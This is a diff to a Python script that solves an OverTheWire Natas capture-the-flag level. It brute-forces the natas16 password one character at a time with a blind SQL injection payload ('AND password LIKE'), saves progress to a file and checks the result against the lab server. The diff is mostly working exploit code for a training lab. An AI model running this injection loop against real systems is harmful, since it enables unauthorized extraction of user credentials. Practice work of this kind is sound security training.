@@ -24,7 +24,7 @@ def mkReqWithPayload(pl):
         }
     )
 
-dict = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+dict = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz '
 plTemplate = 'natas16" AND password LIKE "'
 
 passwd = ''
@@ -32,8 +32,22 @@ bkp_path = 'natas16/.password'
 if os.path.exists(bkp_path):
     bkp = open(bkp_path, 'rb')
     passwd = bkp.read().decode('utf-8')
-    print('restored:', passwd)
     bkp.close()
+
+if len(passwd) == 32:
+    res = rq.get(
+        url = 'http://natas16.natas.labs.overthewire.org/',
+        auth = ('natas16', passwd),
+    )
+    if res.ok:
+        print(passwd)
+        exit(0)
+    else:
+        print('natas16 auth failed')
+        passwd = ''
+        bkp = open(bkp_path, 'wb')
+        bkp.write(passwd.encode('ascii'))
+        bkp.close()
 
 print('\033[?25l', end = '')
 
@@ -45,6 +59,7 @@ def sigint_handler(sig, frame):
 
 def exit_gracefully():
     print('\033[?25h', end = '')
+    bkp.write(passwd.encode('ascii'))
     bkp.close()
     sys.exit(0)
 
@@ -52,16 +67,15 @@ signal.signal(signal.SIGINT, sigint_handler)
       
 while len(passwd) < 32:
     for i in dict:
+        if i == ' ': raise 'failed'
         pl = plTemplate + passwd + i + '%'
         r = mkReqWithPayload(pl)
         if r.ok: 
             print('\rtried:', passwd + i, end = '')
             if r.text.find('This user exists.') > -1:
-                print('\rhit:  ', passwd)
                 passwd += i
-                bkp.write(passwd.encode('ascii'))
+                print('\rhit:  ', passwd)
                 break
-    if passwd == '': raise 'failed'
 
 print('password =', passwd)
 
